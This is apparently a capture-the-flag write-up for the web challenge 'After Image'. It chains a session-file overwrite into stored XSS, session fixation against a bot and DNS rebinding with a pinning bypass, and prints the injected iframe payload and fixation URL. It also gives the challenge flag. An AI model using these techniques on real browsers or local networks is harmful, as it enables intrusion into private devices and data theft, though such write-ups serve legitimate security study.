# After Image
- Category: web
- Solves: 32
- Author: sanmatte

## Description
Given description:
> My friend says visiting links cannot be dangerous because browsers handle the security for us.
>
> I know he's obsessed with this LocalStorage site.
> Can you show him how stupid that is?

From Wikipedia:
> An afterimage, or after-image, is an image that continues to appear in the eyes after a period of exposure to the original image.

## Details
The challenge automatically generates a sess_id as soon as the user visits the site.

The website allows to store "secrets" in the browser's local storage. But this part was not relevant for the solution of the challenge.

The website allows a user to modify its profile, writing the data in the php session, either with a form and a config file.

The flag is provided by the `camera` container which simulates a camera in the victim's local network.

To get the flag we need to:
- obtain xss in the victim's browser
- find a way to read the response of the `camera` from javascript, which is blocked by the same-origin policy

## Exploit XSS
The php code sanitizes the user input during the session modification phase, like so:
```php
$_SESSION[$field] = htmlspecialchars($_POST[$field]);

// and

$_SESSION[$field] = htmlspecialchars($settings[$field]);
```

For this reason we cannot inject any html tags from the normal flow of the application.

However, the file upload functionality is vulnerable to arbitrary file overwrite, and since both the config file and the php session files are saved in `/tmp` we can overwrite the session file with arbitrary content.

Because the session content is not escaped in the rendering phase (as it normally should be), we obtain xss uploading a file with:

```python
f'nickname|s:5:"admin";bio|s:{len(anything)}:"{anything}";theme|s:5:"light";'
```

## DNS Rebinding
We cannot directly read the response of the `camera` because the origin (http://camera/) is different from the current origin of the page (http://afterimage.challs.srdnlen.it/ or http://afterimage-nginx/ for the bot).

Since we know the IP address of the camera inside the docker's network (which simulates a victim local network) we can do something interesting...

We can upload an `iframe` with the src set to a controlled domain, and for this domain we can return , sequentially, 2 different DNS A records:
- first, the IP of a controlled server to load a script with a very low TTL
- second, to the camera's IP, keeping the origin of the `iframe` the same

In this way we can load a script that probes the `iframe src` (our controlled domain) until the dns A record changes to the second IP. Allowing us to read the response and get the `FLAG`.

We upload a file with this:

```
nickname|s:5:"admin";bio|s:54:"<iframe src="http://controlleddomain/attack"></iframe>";theme|s:5:"light";
```

Since `php.ini` allows transparend session ids:
```
session.use_only_cookies = 0
session.use_trans_sid = 1
```
we can exploit session fixation to pass our `sess_id` to the bot and execute the xss:
```python
f'http://afterimage-nginx/index.php?PHPSESSID={id}'
```

You can see the full exploit code in this folder [writeup](writeup/).

But, we have to also deal with the rebinding time. The bot has only 75 seconds until it closes the page.

Two things are important here:
- Low TTLs are not always respected by the browser, and are defaulted to a minimum of 60 seconds in Firefox.
- Even after defaulting the TTL to 60 seconds, this is not always respected, but something called ***DNS pinning*** happens.

***DNS pinning*** forces the browser to higher the valency of the record for more than what the TTL specifies. This is usually around `5 minutes` in Firefox and stricly depends on the browser and OS version (I found it to be around 3 minutes in fedora, and up to 7min on macos - i don't remember the firefox versions).

We bypass this security measure by refusing the connection (or shutting down the server) from our controlled IP, tricking the browser to ***"unpin"*** the record because no longer reachable/valid.

In my `run.py` ([here](writeup/run.py)) I do that by just shutting everything down after the first request:

```python
threading.Timer(2, lambda: os._exit(0)).start()
```

Thanks to this little trick we can rebind in a time between 60 and 70 seconds.

## Questions

#### What about PNA (Private Network Access) and LNA (Local Network Access) policies?

Firefox only blocks requests to `127.0.0.1` and in some versions I believe also `0.0.0.0`, but doesn't block requests to other private IPs. Chrome instead blocks all private IPs by default since `version 142`.

#### What about cache eviction? 

It was not required to solve the challenge, but I found out that some teams still did it. Good job!

#### Was owning a domain required?

No, there are multiple dns rebinding resolvers available online, in my script I used `http://dnsrebindtool.43z.one/` but there are many others.

## Exploit
You can find the full exploit code in the [writeup folder](writeup/).

## Summary
- overwrite session file to get xss: [solver.py](writeup/solver.py)
- pass your session to the bot with session fixation: [solver.py](writeup/solver.py)
- use dns rebinding to bypass `same-origin policy`: [run.py](writeup/run.py)
- encode the camera's response and send it to a webhook: [exploit.js](writeup/exploit.js)

## Flag
`srdnlen{s4me_0rig1n_is_b0ring_as_h3ll}`
